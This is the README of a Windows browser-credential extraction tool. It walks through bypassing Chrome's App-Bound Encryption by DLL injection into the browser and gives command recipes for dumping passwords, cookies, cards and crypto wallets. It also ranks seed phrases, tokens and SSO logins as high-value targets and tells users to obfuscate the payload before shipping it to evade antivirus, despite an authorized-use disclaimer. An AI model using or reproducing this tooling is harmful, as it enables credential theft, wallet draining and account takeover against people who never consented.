<div align="center">

# 👻 phantom elevator

### Multi-Browser Credential Extraction · App-Bound Encryption Bypass

*Walk Chromium and Firefox profile stores, recover the plaintext, rank what matters.*

<br>

<a href="https://github.com/Hidden-Rhythm/abe-bypass">
  <img src="https://img.shields.io/badge/💻_Source-GitHub-18181b?style=for-the-badge&logo=github&logoColor=white" alt="GitHub Source">
</a>
<img src="https://img.shields.io/badge/🐍_Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python 3.10+">
<img src="https://img.shields.io/badge/🪟_Windows-10%20%7C%2011-0078D6?style=for-the-badge&logo=windows11&logoColor=white" alt="Windows 10/11">
<img src="https://img.shields.io/badge/Version-1.0.0-52525b?style=for-the-badge" alt="Version 1.0.0">

<br>

<img src="https://img.shields.io/badge/🔓_ABE-Bypassed-e11d48?style=for-the-badge" alt="ABE Bypassed">
<img src="https://img.shields.io/badge/🌐_Browsers-13_Families-8a2be2?style=for-the-badge" alt="13 Browser Families">
<img src="https://img.shields.io/badge/📡_Filtering-Signal_First-0ea5e9?style=for-the-badge" alt="Signal First">

<br><br>

**DPAPI + V20 BYPASS** &nbsp;·&nbsp; **COM ELEVATION BRIDGE** &nbsp;·&nbsp; **SIGNAL-FIRST RANKING**

<br>

[**⚠️ Authorized Use**](#authorized-use) · [**🚀 Quickstart**](#quickstart) · [**🖥️ CLI**](#cli) · [**🌐 Browsers**](#browsers) · [**⚡ Bypass**](#bypass) · [**🛡️ Obfuscation**](#obfuscation) · [**⚠️ Limitations**](#limitations)

</div>

---

> [!TIP]
> **Want a standalone `.exe` — no Python, no compiler on the target?**
>
> Use **[Hidden-Rhythm/abe_bypass](https://github.com/Hidden-Rhythm/abe_bypass)** — that repo ships:
>
> - 🚀 **Prebuilt `phantom_elevator.exe`** — download from its [Releases](https://github.com/Hidden-Rhythm/abe_bypass/releases/latest) page
> - 🔨 **`build_dll.py` + `build_exe.py`** — build the exe yourself from source
> - 🧬 **`phantom_elevator.py`** — same tool, patched so ABE DLLs resolve from `dlls/` instead of compiling at runtime
>
> This repo is the single-file Python edition. That repo is the standalone-binary edition.

---

## 🎯 What Is Phantom Elevator?

**phantom elevator** is a Windows credential extractor built for the post-ABE era. It walks Chromium and Firefox profile directories, locates every encrypted secret store, and recovers the plaintext — including the **v20 App-Bound Encryption** keys that broke every legacy DPAPI-only extractor.

It is a single-file Python application. No service to install, no driver to sign, no agent to persist.

> 🎯 **The goal:** point it at a machine, let it detect what is installed, and read the output.

<br>

<table>
<tr>
<td width="33%" valign="top">

**🎯 Detect**
Enumerates Chromium and Firefox families from standard install paths. Missing browsers are skipped, not fatal.

</td>
<td width="33%" valign="top">

**🔓 Recover**
Resolves each browser's key store — `v10` via DPAPI, `v20` via an in-process elevation bridge compiled at runtime.

</td>
<td width="33%" valign="top">

**📊 Rank**
Scores every local-storage entry before writing. Wallets, tokens, and seed phrases lead the output.

</td>
</tr>
</table>

---

<a id="authorized-use"></a>
## ⚠️ Authorized Use Only

<table>
<tr>
<td width="100%" valign="top">

**✅ Legitimate uses**

- Authorized penetration testing engagements with a signed scope
- Red-team assessments of your own systems
- Digital forensics on a device you own or have legal custody of
- Incident response triage on a compromised endpoint
- CTF challenges and security research on test machines you control
- Personal account recovery on a machine you own

**❌ Illegal uses**

- Extracting credentials from any device you do not own
- Any form of credential theft, account takeover, or unauthorized access
- Deploying on a victim's machine, through malware, phishing, or social engineering
- Commercial sale of extracted credentials
- Any use that violates the Computer Fraud and Abuse Act, the Computer Misuse Act, GDPR, CFAA § 1030, or local law

</td>
</tr>
</table>

> 🚨 **YOU ARE RESPONSIBLE FOR YOUR OWN USE.** This software is published for authorized security research and educational analysis only. The author does **not** condone, support, or facilitate unauthorized access to computer systems. If you use Phantom Elevator against a system you are not explicitly authorized to test, **you** commit a crime and **you alone** bear the legal consequence.

> 📜 **NO WARRANTY, NO LIABILITY.** This software is provided "as is", without warranty of any kind, express or implied. The author is not liable for any damages, legal action, or consequence arising from use or misuse.

> 🤝 **REPORTING A VULNERABILITY.** If you are a browser vendor or security researcher who has found a flaw this tool touches, contact the author via Discord — responsible disclosure is welcome, abuse is not.

---

<a id="chain"></a>
## 🔗 The Chain That Broke

For years, credential tooling relied on one chain:

```text
Local State  →  encrypted_key (v10)  →  CryptUnprotectData  →  AES-256-GCM  →  plaintext
```

That chain still works — for `v10`.

Chrome 127 introduced **App-Bound Encryption** 🔒. The master key is now sealed inside a COM elevation service that only the browser's own signed process is supposed to reach. DPAPI returns ciphertext. The old chain dead-ends.

---

<a id="bypass"></a>
## ⚡ The ABE Problem

Phantom Elevator adds the missing bridge.

```text
Local State  →  encrypted_key (v20)  →  elevation-service bridge  →  master key  →  AES-256-GCM  →  plaintext
```

<br>

<details open>
<summary><b>⚙️ The bypass, step by step</b></summary>

<br>

```text
phantom_elevator.py
        │
        ├─ 01. Parse Local State → os_crypt.app_bound_encrypted_key
        │
        ├─ 02. Verify the APPB prefix, strip it, keep the sealed blob
        │
        ├─ 03. Compile a tiny C DLL
        │        CLSID + IID_V1 + IID_V2 + vtable offset for the target browser
        │
        ├─ 04. Ensure the browser's elevation service is RUNNING
        │
        ├─ 05. Launch browser --version in a sandboxed TEMP
        │        OpenProcess → VirtualAllocEx → WriteProcessMemory
        │        → CreateRemoteThread(LoadLibraryW)
        │
        ├─ 06. DLL: CoCreateInstance(ElevationService, CLSCTX_LOCAL_SERVER)
        │        → vtable decrypt slot → ph_out.bin
        │
        └─ 07. Python reads the 32-byte key → AES-256-GCM decrypts
                 🍪 cookies · 🔑 passwords · 💳 cards
```

</details>

<br>

Each supported Chromium build ships its own `cls_id`, `iid_v1` / `iid_v2`, elevation service name, and `vtable_offset` — all carried in the `BROWSERS` table. The DLL is compiled at runtime with MinGW-w64 `gcc` or MSVC `cl`, whichever is found. If neither is present, the ABE path disables itself and `v10` extraction continues.

> 💡 **Optional:** drop a `dlls/` folder containing `chrome.dll`, `chrome_beta.dll`, `brave.dll`, `edge.dll`, `avast.dll` beside `phantom_elevator.py` and the runtime compile is skipped. Build them with `build_dll.py` from [abe_bypass](https://github.com/Hidden-Rhythm/abe_bypass).

---

<a id="browsers"></a>
## 🌐 Supported Browsers

### 🔵 Chromium family

| | Browser | Key protection | ABE bridge |
|:---:|:---|:---|:---:|
| <img src="https://www.google.com/s2/favicons?domain=google.com&sz=64" height="18"> | **Google Chrome** | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=google.com&sz=64" height="18"> | Chrome Beta | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=brave.com&sz=64" height="18"> | **Brave** | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=microsoft.com&sz=64" height="18"> | Microsoft Edge | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=avast.com&sz=64" height="18"> | Avast Secure Browser | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=vivaldi.com&sz=64" height="18"> | Vivaldi | DPAPI | ➖ |
| <img src="https://www.google.com/s2/favicons?domain=chromium.org&sz=64" height="18"> | Chromium | DPAPI | ➖ |
| <img src="https://www.google.com/s2/favicons?domain=opera.com&sz=64" height="18"> | Opera | DPAPI | ➖ |
| <img src="https://www.google.com/s2/favicons?domain=opera.com&sz=64" height="18"> | Opera GX | DPAPI | ➖ |

### 🦊 Firefox family

| | Browser | Key protection | Status |
|:---:|:---|:---|:---:|
| <img src="https://www.google.com/s2/favicons?domain=mozilla.org&sz=64" height="18"> | **Firefox** | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=waterfox.net&sz=64" height="18"> | Waterfox | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=librewolf.net&sz=64" height="18"> | LibreWolf | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=floorp.app&sz=64" height="18"> | Floorp | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=zen-browser.app&sz=64" height="18"> | Zen Browser | NSS / `key4.db` | ✅ |

<sub>💡 Detected from `%LocalAppData%`, `%AppData%`, `%ProgramFiles%`. Missing browsers skipped, not fatal.</sub>

---

## 📦 Extraction Matrix

<table>
<tr>
<th></th>
<th align="left">Category</th>
<th align="left">Flag</th>
<th align="left">Chromium source</th>
<th align="left">Firefox source</th>
</tr>
<tr><td>🍪</td><td><b>Cookies</b></td><td><code>--cookies</code></td><td><code>Network/Cookies</code></td><td><code>cookies.sqlite</code></td></tr>
<tr><td>🔑</td><td><b>Passwords</b></td><td><code>--passwords</code></td><td><code>Login Data</code></td><td><code>logins.json</code></td></tr>
<tr><td>📜</td><td>History</td><td><code>--history</code></td><td><code>History</code></td><td><code>places.sqlite</code></td></tr>
<tr><td>📝</td><td>Autofill</td><td><code>--autofill</code></td><td><code>Web Data</code></td><td>—</td></tr>
<tr><td>💳</td><td><b>Cards &amp; IBANs</b></td><td><code>--cards</code></td><td><code>Web Data</code></td><td>—</td></tr>
<tr><td>🗂️</td><td>Local Storage</td><td><code>--local-storage</code></td><td><code>Local Storage/leveldb</code></td><td>—</td></tr>
<tr><td>🔖</td><td>Bookmarks</td><td><code>--bookmarks</code></td><td><code>Bookmarks</code></td><td><code>places.sqlite</code></td></tr>
<tr><td>🧩</td><td>Extensions</td><td><code>--extensions</code></td><td><code>Extensions/</code></td><td>—</td></tr>
<tr><td>🪙</td><td><b>Wallets</b></td><td><code>--wallets</code></td><td>extension storage</td><td>—</td></tr>
<tr><td>👤</td><td>Account</td><td><i>always</i></td><td><code>Preferences</code> / <code>Local State</code></td><td><code>signedInUser.json</code></td></tr>
</table>

<sub>💡 No category flag selected = every category. Account metadata is always written when signed-in data is present.</sub>

---

<a id="signal"></a>
## 📡 Signal-First Filtering

> A raw dump is noise. `--important` keeps only the entries that matter — crypto, finance, identity, and developer hosts.

**🏦 High-value hosts** — from `_IMP_HOSTS`:

```text
MetaMask · Phantom · Coinbase · Binance · Kraken · OKX · KuCoin · Bybit
Uniswap · Aave · OpenSea · WalletConnect · Ledger · Trezor · Trust Wallet
accounts.google.com · login.microsoftonline.com · github.com · gitlab.com
Auth0 · Okta · Discord · Slack
```

**🔑 High-value keys** — matched by `_IMP_KEY_PAT`:

`token` `jwt` `session` `auth` `api_key` `secret` `passw` `private_key` `privatekey` `seed` `mnemonic` `wallet` `keystore` `signer` `phrase`

**💎 High-value values** — matched by `_IMP_VAL_PAT`:

seed phrases · `0x` private keys (40–64 hex) · Bech32 `bc1…` · base58 Bitcoin addresses

`--important` applies to cookies, passwords, history, and local storage. Anything filtered out lands in the `--debug-drops` breakdown as `skipped_not_important`.

---

<a id="quickstart"></a>
## 🚀 Getting Started

### 📋 Requirements

- 🪟 Windows **10 / 11**, x64
- 🐍 Python **3.10 or later**
- 🔨 MinGW-w64 `gcc` or MSVC `cl` — **optional**; enables the ABE / v20 path
- 🌐 Network on first run, for dependency bootstrap

Dependencies resolve automatically on launch:

| Package | Purpose |
|:---|:---|
| `pycryptodome` | AES-256-GCM |
| `python-snappy` | LevelDB block decompression (falls back to built-in decoder) |
| `gcc` | only if `dlls/` is missing — attempted via `winget`, `choco`, then `scoop` |

### 1️⃣ Clone

```bash
git clone https://github.com/Hidden-Rhythm/abe-bypass.git
cd abe-bypass
```

### 2️⃣ Run

```bash
python phantom_elevator.py
```

First run installs `pycryptodome` and `python-snappy` if missing, then attempts a gcc install via `winget` → `choco` → `scoop` (only if `dlls/` is absent).

### 3️⃣ Read the Output

```text
out/
├── Chrome/
│   └── Default/
│       ├── cookies/          → one Netscape .txt per host
│       ├── passwords/        → one TSV .txt per domain
│       ├── history.txt
│       ├── autofill.txt
│       ├── credit_cards.txt
│       ├── local_storage/    → one readable .txt per origin
│       ├── bookmarks.txt
│       ├── extensions.txt
│       └── account.txt
└── Firefox/
    └── <profile>/
        ├── cookies/
        ├── passwords/
        ├── history.txt
        ├── bookmarks.txt
        └── account.txt
```

Full flag surface, recipes, and exit codes: [🖥️ CLI Reference](#cli).

---

## 📂 Input & Output

Phantom Elevator discovers profile directories on its own. `--target` narrows to one browser; `-o` changes the output root.

**Example input**

```text
C:\Users\<name>\AppData\Local\Google\Chrome\User Data\Default\
```

**Default output root**

```text
out\
```

### 📄 Output files

Default is `--format tsv`, which writes plain `.txt`.

| Artifact | Default (`tsv`) | `--format csv` | `--format json` |
|:---|:---|:---|:---|
| 🍪 Cookies | `cookies/<host>.txt` (Netscape) | `cookies.csv` | `cookies.json` |
| 🔑 Passwords | `passwords/<domain>.txt` (TSV) | `passwords.csv` | `passwords.json` |
| 📜 History | `history.txt` | `history.csv` | `history.json` |
| 📝 Autofill | `autofill.txt` + `autofill_profiles.txt` | `autofill.csv` + `autofill_profiles.csv` | `autofill.json` |
| 💳 Cards | `credit_cards.txt` + `ibans.txt` | `credit_cards.csv` + `ibans.csv` | `cards.json` |
| 🗂️ Local Storage | `local_storage/<host>.txt` | `local_storage.csv` | `local_storage.json` |
| 🔖 Bookmarks | `bookmarks.txt` | `bookmarks.csv` | `bookmarks.json` |
| 🧩 Extensions | `extensions.txt` (JSON inside) + `extensions/<id>/` | `extensions.csv` | `extensions.txt` |
| 🪙 Wallets | `wallets/<name>/vault.json` + raw dumps | same | same |
| 👤 Account | `account.txt` | `account.txt` | `account.txt` |

<sub>💡 <code>--format txt</code> is aliased to <code>tsv</code>. <code>extensions.txt</code> and <code>account.txt</code> are always written. Cards are masked in the console but written in full to disk.</sub>

---

<a id="cli"></a>
## 🖥️ Command Line

Every flag is optional. With no arguments, it detects browsers, runs every category, and writes to `out\`.

```bash
python phantom_elevator.py [OPTIONS]
```

<br>

### 📦 Categories

| Flag | What it does |
|:---|:---|
| `--all` | Every category (same as passing none) |
| `--cookies` | 🍪 HTTP cookies |
| `--passwords` | 🔑 Saved logins |
| `--history` | 📜 Browsing history |
| `--autofill` | 📝 Form autofill fields and profiles |
| `--cards` | 💳 Credit cards and IBANs |
| `--local-storage` | 🗂️ Local Storage leveldb entries |
| `--bookmarks` | 🔖 Bookmarks |
| `--extensions` | 🧩 Installed extensions and their storage |
| `--wallets` | 🪙 Wallet vault extraction and raw dumps |

<sub>💡 Boolean switches, not key/value pairs. Combine freely: <code>--cookies --passwords --cards</code>.</sub>

<br>

### 🎛️ Run Control

| Flag | Argument | Default | What it does |
|:---|:---|:---|:---|
| `-o`, `--output` | `DIR` | `out` | 📁 Output directory |
| `-t`, `--target` | `NAME` | all | 🎯 One browser — `chrome`, `brave`, `edge`, `avast`, `vivaldi`, `chromium`, `opera`, `opera gx`, `firefox`, `waterfox`, `librewolf`, `floorp`, `zen` |
| `--force-kill` | — | off | 🔪 Terminate browsers first — unlocks locked DBs |
| `--wallet-password` | `PW` | `$PE_WALLET_PW` | 🔐 Wallet vault password |
| `--no-wallet-prompt` | — | off | 🙅 Never prompt |
| `--jobs` | `N` | `1` | ⚡ Parallel browser jobs; `1` streams live output |

<br>

### 🧭 Modes

| Flag | What it does |
|:---|:---|
| `--list-browsers` | 🌐 Detected browsers, profile counts, ABE service state |
| `--list-wallets` | 🪙 Supported wallets, schemes, hashcat modes, IDs |
| `--audit-only` | 🩺 Read-only SQLite health audit — no bootstrap, no secrets read, no files modified |
| `--install-launchers` | 📜 Write `pe.bat` and `pe-admin.bat` beside the script |

<br>

### 🎨 Output

| Flag | Argument | Default | What it does |
|:---|:---|:---|:---|
| `--format` | `tsv` \| `json` \| `csv` \| `txt` | `txt` | 🗄️ `tsv`/`txt` → plain `.txt`; `csv`/`json` → structured |
| `--important` | — | off | 💎 High-value targets only |
| `--debug-drops` | — | off | 🔍 Skipped-entry breakdown with reasons and counts |
| `--no-color` | — | off | ⚪ Disable ANSI; auto-on when stdout isn't a TTY |
| `-v`, `--verbose` | — | off | 📋 Per-entry samples + tracebacks on job failure |
| `-q`, `--quiet` | — | off | 🤫 Suppress banner and progress |

<br>

### 🧾 Recipes

```bash
# everything, default text output
python phantom_elevator.py

# close browsers first — unlocks locked databases
python phantom_elevator.py --force-kill

# just cookies and passwords
python phantom_elevator.py --cookies --passwords

# cards and autofill only
python phantom_elevator.py --cards --autofill

# wallets, prompt for password
python phantom_elevator.py --wallets

# wallets, non-interactive
python phantom_elevator.py --wallets --wallet-password 'my pass'

# wallets via environment variable
set PE_WALLET_PW=my pass
python phantom_elevator.py --wallets --no-wallet-prompt

# high-value only, as JSON
python phantom_elevator.py --important --format json

# one browser, custom folder
python phantom_elevator.py -t chrome -o C:\Users\dj\Desktop\drop

# Opera GX (note the space)
python phantom_elevator.py -t "opera gx"

# four browsers in parallel
python phantom_elevator.py --jobs 4

# read-only health check
python phantom_elevator.py --audit-only

# what's installed here?
python phantom_elevator.py --list-browsers

# which wallets are supported?
python phantom_elevator.py --list-wallets

# create launcher scripts
python phantom_elevator.py --install-launchers

# investigate silent drops
python phantom_elevator.py --debug-drops -v
```

<br>

### 🚦 Exit codes

| Code | Meaning |
|:---:|:---|
| `0` | ✅ Clean run. `--audit-only` also returns `0` when every DB passes `quick_check` |
| `1` | ⚠️ Partial — jobs failed, profiles skipped, or a DB couldn't be copied. Also: non-Windows host, empty `--output`, no categories, failed audit, launcher write error |
| `2` | 🚫 Nothing ran — no browsers matched `--target`, or no job completed |
| `130` | 🛑 `Ctrl+C` |

<br>

<details>
<summary><b>🔧 When a new browser build breaks ABE</b></summary>

<br>

Run the failing browser with drops visible:

```bash
python phantom_elevator.py -t chrome --cookies --debug-drops -v
```

ABE failures land in the drops table as `abe` or `crypto` reasons — `no_local_state`, `no_abe_key_in_state`, `bad_abe_prefix`, `service_unavailable`, `compile_failed`, `inject_failed`, `bad_key_length`. On a decryption failure the DLL writes `ph_err.txt` into the sandbox with the exact `CoCreateInstance` or `Decrypt` HRESULT.

The four values that move between Chromium major releases:

| Field | What it is |
|:---|:---|
| `cls_id` | Elevation service CLSID |
| `iid_v1` | Interface IID tried first |
| `iid_v2` | Interface IID tried second — blank skips |
| `vtable_offset` | Byte offset into the vtable; ÷8 for the slot index |

Also confirm `services` — the elevation service name — is `RUNNING` via `--list-browsers`.

If you're using prebuilt DLLs, update the `BROWSERS` table, then re-run `build_dll.py` from [abe_bypass](https://github.com/Hidden-Rhythm/abe_bypass) to rebuild the affected DLL.

</details>

---

<a id="obfuscation"></a>
## 🛡️ Hardening the Payload

> **Obfuscate before you ship.** Phantom Elevator is a single-file Python application — a drop-in target for the [**Hidden-Rhythm obfuscator**](https://github.com/Hidden-Rhythm/obfuscator) pipeline.

```text
              ┌──────────────────────────┐
              │     01. Read Source      │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │ 02. Encrypt Constants    │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │    03. Build Payload     │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │    04. Build Stage 2     │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │   05. Build Bootstrap    │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │    06. Emit Surface      │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │    07. Verify Syntax     │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │     08. Write Output     │
              └──────────────────────────┘
```

### ▶️ Run it

```bash
git clone https://github.com/Hidden-Rhythm/obfuscator.git
cd obfuscator
python -m pip install rich
python obfuscator.py
```

When prompted, provide the path to `phantom_elevator.py`. Accept the default output name, `phantom_elevator_obf.py`.

<br>

| Layer | Effect |
|:---|:---|
| 🌳 AST transformation | restructures eligible syntax-tree nodes |
| 🔐 Constant encoding | XOR-encodes strings and byte constants |
| 📦 Payload serialization | compiles to a `marshal` code object |
| 🗜️ Compression | `zlib` + base64 chunking |
| 🚀 Layered loader | bootstrap and runtime-loading stages |
| 🎭 Generated identifiers | breaks static symbol matching |
| ✅ Syntax verification | compiles the output before writing |

<br>

> 💡 The generated payload uses `marshal`-serialized code objects, which are Python-version dependent. Build and run on the **same interpreter version**. The obfuscator's runtime environment checks can affect execution in unusual sandboxes — test the generated file before deploying it.

The obfuscator reports a SHA-256 build fingerprint and per-stage timings, so every hardened build is traceable to its source.

> ⚠️ **Obfuscating breaks the runtime ABE compile path.** The generated code object can't be compiled to C by gcc at runtime. If you need ABE on an obfuscated build, drop a prebuilt `dlls/` folder beside the output — build it with `build_dll.py` from [abe_bypass](https://github.com/Hidden-Rhythm/abe_bypass).

---

## 🏗️ Architecture

```text
┌─────────────────────────────────────────────────────────────┐
│                     PHANTOM ELEVATOR                        │
│                   single-file Python app                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Browser discovery                                         │
│        │                                                    │
│        ├── Chromium profiles ──┐                            │
│        └── Firefox profiles ───┤                            │
│                                ▼                            │
│                     Profile walker                          │
│                                │                            │
│              ┌─────────────────┼─────────────────┐          │
│              ▼                 ▼                 ▼          │
│          SQLite reader     LevelDB reader    NSS reader     │
│              │                 │                 │          │
│              └─────────────────┼─────────────────┘          │
│                                ▼                            │
│                     Key recovery layer                      │
│              ┌─────────────────┴─────────────────┐          │
│              ▼                                   ▼          │
│        DPAPI (v10)                        ABE bridge (v20)  │
│        CryptUnprotectData                 COM + DLL inject  │
│              └─────────────────┬─────────────────┘          │
│                                ▼                            │
│                     AES-256-GCM decrypt                     │
│                                │                            │
│                                ▼                            │
│               .txt · .csv · .json output                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔬 Technical Details

| Component | Implementation |
|---|---|
| 🐍 Language | Python 3.10+ |
| 🔧 ABE bridge | C — resolved from `dlls/` if present, else compiled at runtime with `gcc` / `cl` |
| 🔓 Key unprotection | DPAPI `CryptUnprotectData` + AES-256-GCM |
| ⚡ ABE access | COM elevation service + DLL injection |
| 🎯 Injection primitives | `OpenProcess` · `VirtualAllocEx` · `WriteProcessMemory` · `CreateRemoteThread` |
| 🗄️ LevelDB parsing | Built-in log/table reader; `python-snappy` when available |
| 🔐 Crypto | `pycryptodome` |
| 🍪 Cookie serialization | Netscape |
| 🔑 Password serialization | TSV |
| 🦊 Firefox passwords | NSS in-process via `ctypes` — no subprocess, no external Python |
| 🪙 Wallet vaults | MetaMask, Phantom, Coinbase, Rabby, Trust + 14 generic |
| 🧾 Build fingerprint | SHA-256 (via obfuscator) |

<a id="limitations"></a>
### ⚠️ Compatibility & Limitations

- 🪟 **Windows only.** The ABE bridge and DPAPI calls are Win32-specific.
- 🔄 **ABE is per-build.** Chromium CLSIDs, IIDs, service names, and vtable offsets change across browser releases. The `BROWSERS` table is the source of truth — update it when a target ships a new elevation service.
- 🔨 **Compiler required for v20.** Without `gcc` or `cl`, and without a `dlls/` folder, the ABE path is disabled. `v10` and Firefox extraction still run.
- 🔒 **Running browsers may lock stores.** SQLite and LevelDB files can be held open. Close the browser, or use `--force-kill`.
- 🛡️ **Antivirus is expected to react.** DLL injection and credential access are high-signal behaviors. The obfuscator raises static-analysis cost; it does not make runtime behavior invisible.
- 🧬 **Obfuscator output is version-bound.** Generate and execute on the same Python minor version.
- 🦊 **Firefox passwords need NSS.** `nss3.dll` must be findable — it ships with every Firefox-family install and is located automatically.

Test generated output thoroughly before using it in a production workflow.

---

## 🗂️ Project Structure

```text
abe-bypass/
├── README.md
└── phantom_elevator.py    main application
```

The entire application — browser tables, DPAPI layer, ABE compiler, injector, profile walkers, wallet decryptors, and output writers — lives in one file. No package tree, no build step.

Optional companion files, sourced from [abe_bypass](https://github.com/Hidden-Rhythm/abe_bypass):

```text
(optional, from abe_bypass)
├── build_dll.py           dev-only: generates dlls/*.dll
├── build_exe.py           dev-only: Nuitka build → dist/phantom_elevator.exe
└── dlls/                  prebuilt ABE DLLs — drop beside phantom_elevator.py
    ├── chrome.dll
    ├── chrome_beta.dll
    ├── brave.dll
    ├── edge.dll
    └── avast.dll
```

Drop `dlls/` next to `phantom_elevator.py` to skip runtime compile.

---

## 🛠️ Built With

| Technology | Purpose |
|---|---|
| 🐍 Python | Core application and extraction pipeline |
| 🔐 DPAPI | `v10` key unprotection |
| ⚡ COM | Elevation-service access for `v20` |
| 📦 `pycryptodome` | AES-256-GCM decryption |
| 🗜️ `python-snappy` | LevelDB block decompression |
| 🎨 ANSI | Terminal banner, spinner, summary box |

---

## 🔗 Links

<div align="center">

<a href="https://github.com/Hidden-Rhythm/abe_bypass">
  <img src="https://img.shields.io/badge/EXE_Edition-abe__bypass-e11d48?style=for-the-badge&logo=windows&logoColor=white" alt="EXE Edition">
</a>

<a href="https://github.com/Hidden-Rhythm/abe_bypass/releases/latest">
  <img src="https://img.shields.io/badge/⬇️_Download_Latest-22c55e?style=for-the-badge&logo=github&logoColor=white" alt="Download Latest">
</a>

<a href="https://github.com/Hidden-Rhythm/obfuscator">
  <img src="https://img.shields.io/badge/Companion-obfuscator-52525b?style=for-the-badge&logo=github&logoColor=white" alt="Obfuscator">
</a>

<a href="https://github.com/Hidden-Rhythm">
  <img src="https://img.shields.io/badge/Developer-Hidden--Rhythm-52525b?style=for-the-badge&logo=github&logoColor=white" alt="Developer Profile">
</a>

<a href="https://discord.com/users/hidden_rhythm">
  <img src="https://img.shields.io/badge/Discord-hidden__rhythm-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord">
</a>

</div>

---

<div align="center">

### 👻 Built with Python.

**Hidden-Rhythm**

<sub>phantom elevator · v1.0.0 · ABE bypass · 13 browser families · python edition</sub>

</div>
